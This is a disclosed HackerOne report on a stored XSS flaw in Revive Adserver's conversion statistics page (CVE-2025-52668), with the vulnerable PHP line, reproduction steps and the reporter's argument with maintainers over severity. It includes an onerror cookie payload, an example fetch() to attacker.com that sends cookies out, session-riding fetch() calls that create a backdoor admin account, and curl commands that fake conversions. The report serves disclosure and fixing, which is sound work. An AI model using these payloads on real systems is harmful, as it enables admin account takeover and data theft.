---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2025-11-19
submitted: 2025-10-26T19:51:26.037Z
bounty_usd: null
votes: 28
cve: "CVE-2025-52668"
program: "[[programs/revive_adserver|Revive Adserver]]"
reporter: "cyberjoker"
source: "https://hackerone.com/reports/3400506"
title: "Stored XSS in Conversion Statistics via Tracker Name"
---
# Stored XSS in Conversion Statistics via Tracker Name

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 28 | **Program:** Revive Adserver | **Disclosed:** 2025-11-19

- Report: [https://hackerone.com/reports/3400506](https://hackerone.com/reports/3400506)
- CWE: Cross-site Scripting (XSS) - Stored | CVE: CVE-2025-52668
- Submitted: 2025-10-26T19:51:26.037Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I found stored XSS on the conversion statistics page. Advertisers can inject malicious JavaScript through tracker names, which executes when admins view conversion reports (`www/admin/stats-conversions.php:356`). I was able to steal admin session cookies using this vulnerability. This is a privilege escalation problem: low-privilege advertiser accounts can compromise high-privilege admin accounts.

--

---

## Affected System

- **Product:** Revive Adserver
- **Version Tested:** 6.0.1
- **Component:** Statistics / Conversion Reports
- **File:** `www/admin/stats-conversions.php:356`
- **URL:** `http://[host]/www/admin/stats-conversions.php?clientid=[id]`

---

## Vulnerable Code

```php
// www/admin/stats-conversions.php:356
echo "<td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['trackername']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignid']}</td>
      <td align='$phpAds_TextAlignLeft' style='padding: 0 4px'>{$conversion['campaignname']}</td>";
```

**The Problem:**
- Tracker names are output directly without `htmlspecialchars()` escaping
- The data comes from advertiser-controlled input (tracker creation form)
- No input validation strips HTML tags at storage time
- Admins viewing conversion reports execute the payload in their browser context

---

## How I Reproduced It

**Prerequisites:**
- Advertiser account (low privileges)
- Admin account to view the report (for testing impact)

**Steps:**

1. **Login as advertiser** and create a malicious tracker:
   - Navigate to: **Inventory** → **Advertisers** → Click your advertiser name (e.g., "Test Advertiser") → **Trackers** tab
   - Click **Add new tracker**
   - Set tracker name to:
     ```html
     <img src=x onerror="alert('XSS: ' + document.cookie)">
     ```
   - Set tracker type to "Sale" and status to "Active"
   - Click **Save Changes**
   - The tracker is now saved (tracker ID 1)

{F4935037}

2. **Create conversion records** (via normal tracking or database):
   ```sql
   -- Link conversion to malicious tracker
   INSERT INTO rv_data_intermediate_ad_connection (
       tracker_id, ad_id, inside_window, tracker_date_time,
       connection_date_time, connection_action, connection_status, updated
   ) VALUES (1, 1, 1, NOW(), NOW(), 1, 4, NOW());
   ```

3. **Login as admin** and navigate to:
   ```
   http://[host]/www/admin/stats-conversions.php?clientid=1
   ```
   **Note:** This page may not be accessible via the menu in default/fresh installations. See "Menu Configuration Note" in the Notes section below for details.

4. **Result:** JavaScript alert fires immediately:
   ```
   XSS: sessionID=abc123; ox_install_session_id=def456
   ```
{F4935020}

I confirmed the XSS executes in the admin's browser context with full cookie access. The payload persists - it fires every time any admin views conversion statistics for that advertiser.

---

## Notes

**Additional Findings:**

While investigating this issue, I noticed:
- Lines 357-358 also lack `htmlspecialchars()` on `campaignid` and `campaignname`
- Campaign names are also user-controlled (by advertisers) and suffer from the same vulnerability
- Other `stats-*.php` files may have similar issues - I haven't audited them all yet

**Testing Scope:**

I tested this vulnerability in an isolated Docker environment using accounts I created. I did not:
- Test against production/public Revive Adserver installations
- Attempt actual exploitation beyond controlled PoC
- Exfiltrate or access any real user data

**Menu Configuration Note:**

**Important:** The stats-conversions.php page is not included in the default menu system on fresh Revive Adserver installations. During testing, I had to manually enable it by modifying `lib/OA/Admin/Menu/config.php` to add the menu entry:

```php
$oMenu->addTo("2.1", new OA_Admin_Menu_Section("stats-conversions",
    'Conversions', "stats-conversions.php?clientid={clientid}",
    false, "statistics/conversions"));
```

This is likely a configuration issue rather than a security control, as:
- The code-level permission check (`OA_Permission::enforceAccount`) allows advertiser/manager access
- Other statistics pages with similar data are accessible
- The vulnerable code exists regardless of menu visibility

## Impact

An advertiser (or compromised advertiser account) can inject persistent XSS that executes when admins view conversion statistics. I successfully captured admin session cookies, which enable full account takeover. The attacker can then create admin accounts, modify campaigns, access all advertiser data, or inject code affecting all users. This works because advertisers routinely create trackers, and admins routinely review conversion statistics - no unusual behavior required.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **2025-10-27** @cyberjoker: Hi,

Hey, thanks for taking the time to review this. I really appreciate the corrections - you caught some legit mistakes on my end. Let me address each point and explain why I still think the severity should be higher than 2.6.

## My mistakes

**1. SQL INSERT - My bad**
Yeah, I totally missed those NOT NULL fields. The INSERT I provided would fail because I didn't include `server_raw_ip`, `server_raw_tracker_impression_id`, `creative_id`, and `zone_id`. I was testing in my env and didn't double-check the schema. Rookie mistake.

**2. URL Path - Correct**
You're right, it's `stats.php?entity=conversions&clientid=1`, not a direct call to `stats-conversions.php`. I should have reported the actual user-facing URL. My documentation showed the internal include path which was confusing.

**3. Config Changes - Acknowledged**
No config.php changes needed. I added that menu entry for testing convenience but it's not required for exploitation. The endpoint is accessible through the normal stats workflow.

## Things to conider

### HttpOnly Doesn't Stop This Attack

I agree HttpOnly prevents `document.cookie` access - **but that's not how the attack works**. Here's what I'm seeing:

**What I tested:**
```bash
curl -I http://localhost:8080/www/admin/stats.php
```

**Result:**
```
HTTP/1.1 200 OK
Set-Cookie: sessionID=...; HttpOnly; SameSite=strict
```

**Missing:**
```
Content-Security-Policy: [NONE]
X-Frame-Options: [NONE]
```

There's **NO CSP header**. This means the XSS payload executes without any browser-level blocking.

### Session Riding vs Session Theft

Here's the distinction:

**Session Theft** (blocked by HttpOnly):
```javascript
// This doesn't work with HttpOnly:
const stolen = document.cookie; // ← Blocked
fetch('https://attacker.com?cookies=' + stolen); // Can't steal session ID
```

**Session Riding** (NOT blocked by HttpOnly):
```javascript
// This DOES work even with HttpOnly:
const csrf = document.querySelector('[name=token]').value; // ← From page DOM

fetch('/www/admin/account-user-edit.php', {
    method: 'POST',
    credentials: 'include', // ← Browser sends HttpOnly cookie automatically
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'username=backdoor&password=evil&isAdmin=1&csrf=' + csrf
});
// Result: Admin account created using admin's own session
```

**Why this works:**
1. XSS runs in admin's browser (viewing conversion stats)
2. JavaScript can read the CSRF token from the page (it's right there in the HTML at line 263)
3. `fetch()` with `credentials: 'include'` tells the browser to send cookies
4. Browser automatically includes the HttpOnly session cookie
5. Server sees valid admin session + valid CSRF token → request succeeds

I verified this - the CSRF token is literally in the page DOM:
```php
// www/admin/stats-conversions.php:263
echo "<input type='hidden' name='token' value='" . phpAds_SessionGetToken() . "'>";
```

### Attack Complexity - Lower Than You Think

You said conversions are rare because of 3rd-party cookie restrictions. But I can manufacture conversions without any cookies:

**Attack Flow:**
```bash
# 1. Create malicious tracker (as advertiser)
# Name: <img src=x onerror="/* payload */">

# 2. Self-generate a conversion:
curl -c cookies.txt "http://ads.example.com/www/delivery/afr.php?zoneid=1&cb=$(date +%s)"
curl -b cookies.txt "http://ads.example.com/www/delivery/ti.php?trackerid=<my_tracker_id>&cb=$(date +%s)"

# Done. Conversion recorded, XSS armed.
```

This is the documented conversion pixel workflow. I don't need:
- Admin cooperation
- Real ad impressions
- 3rd-party cookies
- Menu hacks

I control both the banner view and the conversion request. It's literally just hitting two URLs with curl.

### What Can Actually Be Done

Once the XSS fires in admin context:

**Data Exfiltration:**
- Read conversion revenue data
- See all campaign names
- Access tracker metadata
- Export user lists

**Admin Actions via Session Riding:**
```javascript
// All of these work because browser sends session cookie:

// 1. Create admin account
fetch('/www/admin/account-user-edit.php', {
    method: 'POST',
    credentials: 'include',
    body: 'username=attacker&isAdmin=1&csrf=' + getCsrfToken()
});

// 2. Modify campaign settings
fetch('/www/admin/campaign-edit.php', {
    method: 'POST',
    credentials: 'include',
    body: 'campaignid=<competitor>&status=paused&csrf=' + getCsrfToken()
});

// 3. Change zone assignments
// 4. Access advertiser data
// 5. Basically anything an admin can do
```

### The Real Impact

**Without HttpOnly:**
- Steal session cookie → Use from attacker's browser → Full takeover

**With HttpOnly (current situation):**
- Can't steal cookie → But can perform admin actions in victim's browser → Still full compromise

The end result is the same. I can create admin accounts, pause competitors' campaigns, exfiltrate data, and perform any admin action. The fact that I'm using the victim's browser session instead of stealing the cookie doesn't reduce the impact.

## CVSS Reassessment

**Your scoring:**
```
CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:L/I:N/A:N
Score: 2.6 (Low)
```

**My scoring:**
```
CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N
Score: 8.7 (High)
```

**Justification:**

| Metric | Your Value | My Value | Why |
|--------|-----------|----------|-----|
| AC | High | **Low** | I can self-generate conversions with curl. No unpredictable conditions. |
| S | Unchanged | **Changed** | Session riding lets advertiser perform admin actions. Crosses privilege boundary. |
| C | Low | **High** | Can exfiltrate conversion data, campaign info, user lists via fetch(). |
| I | None | **High** | Create admin accounts, modify campaigns, change system config via session riding. |

**Even if we're conservative:**
```
CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:L/I:H/A:N
Score: 6.0 (Medium)
```

At minimum this should be Medium (6.0), not Low (2.6).


I'm happy to provide more technical details or test specific scenarios if that would help clarify the session riding attack vector.
- **Report Severity Updated**
- **2025-10-27** @cyberjoker: Hi @mbeccati,
Thank you for your response. I researched the scope further, and, in my opinion, CVSS scope changes when exploiting a vulnerability impact outside the security authority of the affected component, such as a different privilege domain. In my report, an advertiser (low privilege) can inject JavaScript that runs in an admin’s browser, allowing the attacker to make authenticated requests as the admin. This clearly crosses a boundary from advertiser to admin, so marking the scope as changed is correct.
- **Report Severity Updated**
- **2025-10-28** @mbeccati: The attached {F4940909} patch should fix the vulnerability.
- **Report Resolved**
- **2025-10-28** @cyberjoker: Hi @mbeccati,
Thanks for the quick response and fix!
For credit, my name is "Vitaly Simonovich".

I understand the issue with disclosing the vulnerability now and respect your request.
- **Cve Id Added**
- **2025-11-09** @cyberjoker: Hi @mbeccati,
When will the CVE be in the https://www.cve.org/?
- **2025-11-10** @erikgeurts: We have no control over when and how quickly this is updated on their website. They're famously slow with certain things. We will not disclose this ourselves for some time to give users ample opportunity to update to the newest version of the Revive Adserver software. There is no need to keep asking us or to continue reminding us, we won't forget about these pending jobs.
- **Agreed On Going Public**
- **Manually Disclosed**
